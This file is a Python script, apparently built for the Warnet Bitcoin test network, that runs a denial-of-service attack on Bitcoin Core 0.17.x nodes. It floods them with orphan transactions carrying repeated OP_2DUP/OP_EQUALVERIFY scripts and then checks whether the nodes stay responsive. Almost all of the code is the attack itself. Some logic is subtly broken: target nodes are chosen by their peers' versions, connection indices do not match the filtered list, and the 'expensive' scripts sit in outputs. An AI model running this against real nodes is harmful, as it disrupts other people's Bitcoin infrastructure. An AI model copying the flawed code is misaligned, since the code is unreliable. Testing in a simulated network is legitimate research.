#!/usr/bin/env python3
import time
import threading
from test_framework.messages import CTransaction, CTxIn, CTxOut, COutPoint, ToHex, msg_tx, msg_ping
from test_framework.p2p import P2PInterface
from test_framework.script import CScript, OP_DROP, OP_2DUP, OP_EQUALVERIFY, OP_CHECKSIG, OP_TRUE
from test_framework.util import assert_greater_than
from warnet.test_framework_bridge import WarnetTestFramework

def cli_help():
    return "Run Orphan Transaction DoS test on remote Bitcoin Core 0.17.x nodes"

class OrphanTxDoSNode(P2PInterface):
    def __init__(self):
        super().__init__()
        self.last_pong = None

    def on_pong(self, message):
        self.last_pong = time.time()

class OrphanTxDoSTest(WarnetTestFramework):
    def set_test_params(self):
        self.num_nodes = 0  # We'll connect to existing nodes in the network
        self.num_orphans = 100
        self.test_duration = 600  # 10 minutes
        self.stop_event = threading.Event()

    def create_expensive_script(self):
        # Create a script that's expensive to validate but always invalid
        script = CScript([OP_2DUP, OP_EQUALVERIFY] * 16 + [OP_TRUE])
        return script

    def run_test(self):
        self.wait_for_network_connection()
        target_nodes = self.find_target_nodes()

        if not target_nodes:
            self.log.warning("No nodes running version 0.17.x found")
            return

        for i, node in enumerate(target_nodes):
            self.log.info(f"Testing node {i} running version 0.17.x")
            p2p = self.establish_p2p_connection(node, i)
            parent_tx = self.create_parent_transaction(node)
            orphan_txs = self.create_orphan_txs(parent_tx)

            monitor_thread = threading.Thread(target=self.monitor_node_connection, args=(node,))
            exploit_thread = threading.Thread(target=self.send_orphan_txs, args=(p2p, orphan_txs))

            monitor_thread.start()
            exploit_thread.start()

            monitor_thread.join()
            exploit_thread.join()

            self.check_node_responsiveness(node, p2p, parent_tx)

    def wait_for_network_connection(self):
        self.log.info("Waiting for complete network connection...")
        while not self.warnet.network_connected():
            time.sleep(5)
        self.log.info("Network connected")

    def find_target_nodes(self):
        target_nodes = []
        for node in self.nodes:
            peer_info = node.getpeerinfo()
            for peer in peer_info:
                if 170000 <= peer['version'] < 180000:
                    target_nodes.append(node)
                    self.log.info(f"Found node running version 0.17.x: {peer['version']}")
                    break
        return target_nodes

    def establish_p2p_connection(self, node, index):
        return node.add_p2p_connection(OrphanTxDoSNode(), dstaddr=self.warnet.tanks[index].ipv4, dstport=18444)

    def create_parent_transaction(self, node):
        parent_tx = CTransaction()
        parent_tx.vin.append(CTxIn(COutPoint(int('0' * 64, 16), 0), CScript([OP_TRUE])))
        for _ in range(self.num_orphans):
            parent_tx.vout.append(CTxOut(1000000, CScript([OP_TRUE])))
        parent_tx.rehash()
        return parent_tx

    def create_orphan_txs(self, parent_tx):
        orphan_txs = []
        for i in range(self.num_orphans):
            tx = CTransaction()
            tx.vin.append(CTxIn(COutPoint(parent_tx.sha256, i)))
            expensive_script = self.create_expensive_script()
            tx.vout.append(CTxOut(900000, expensive_script))
            tx.rehash()
            orphan_txs.append(tx)
        return orphan_txs

    def send_orphan_txs(self, p2p, orphan_txs):
        self.log.info(f"Sending {len(orphan_txs)} orphan transactions")
        start_time = time.time()
        for i, tx in enumerate(orphan_txs):
            if self.stop_event.is_set():
                self.log.info("Stopping orphan tx transmission due to node disconnection")
                break
            p2p.send_message(msg_tx(tx))
            if i % 10 == 0:
                elapsed_time = time.time() - start_time
                self.log.info(f"Sent {i+1} orphan transactions in {elapsed_time:.2f} seconds")
        total_time = time.time() - start_time
        self.log.info(f"Finished sending orphan transactions in {total_time:.2f} seconds")

    def monitor_node_connection(self, node):
        start_time = time.time()
        self.log.info("Monitoring node connection status...")

        while time.time() - start_time < self.test_duration:
            if not node.is_connected():
                self.log.error("Node disconnected during the test")
                self.stop_event.set()
                return
            time.sleep(10)

        if node.is_connected():
            self.log.info("Node remained connected throughout the test duration")
        else:
            self.log.error("Node disconnected at the end of the test duration")

    def check_node_responsiveness(self, node, p2p, parent_tx):
        try:
            start_time = time.time()
            
            # Send the parent transaction
            p2p.send_message(msg_tx(parent_tx))

            # Wait a bit for the node to process the transaction
            time.sleep(5)

            # Check node responsiveness by sending pings
            for _ in range(6):  # Check every 10 seconds for a minute
                p2p.send_message(msg_ping())
                time.sleep(10)
                if p2p.last_pong is None or time.time() - p2p.last_pong > 30:
                    self.log.error("Node is not responding to pings")
                    assert False, "Node became unresponsive during orphan processing"

            end_time = time.time()
            processing_time = end_time - start_time

            self.log.info(f"Time taken to process potential orphans: {processing_time:.2f} seconds")

            if processing_time > 300:  # If it took more than 5 minutes
                self.log.warning("Node took an unusually long time to process potential orphans. Possible DoS vulnerability.")
            else:
                self.log.info("Node remained responsive while processing potential orphans.")

            # Final responsiveness check
            p2p.send_message(msg_ping())
            time.sleep(10)
            assert p2p.last_pong is not None and time.time() - p2p.last_pong <= 30, "Node became unresponsive after orphan processing"

        except Exception as e:
            self.log.error(f"Error during node responsiveness check: {str(e)}")
            assert False, "Node failed during Orphan transaction DoS attack test"

if __name__ == "__main__":
    OrphanTxDoSTest().main()
